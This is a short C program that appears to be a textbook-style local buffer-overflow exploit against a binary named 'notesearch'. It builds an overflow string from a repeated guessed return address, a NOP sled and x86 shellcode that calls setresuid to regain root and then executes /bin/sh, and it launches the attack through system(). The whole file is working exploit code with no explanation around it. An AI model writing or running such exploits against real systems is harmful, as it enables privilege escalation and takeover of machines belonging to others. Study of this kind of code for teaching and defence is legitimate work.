#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]){
	unsigned int i, *ptr, ret, offset = 270;
	char *command, *buffer;

	command = (char*) malloc(200);
	bzero(command, 200);
	// memset(command, NULL, 200);
	strcpy(command, "./notesearch \' ");
	buffer = command + strlen(command);

	if (argc > 1 )
		offset = atoi(argv[1]);

	ret = (unsigned int ) &i - offset;

	for(i = 0; i < 160; i+=4){
		*((unsigned int*) (buffer + i)) = ret;
	}
	memset(buffer, 0x90, 60); //NOP slide
	memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);
	strcat(command, "\'");
	system(command); // run exploit
	
	free(command);
	return 0;
}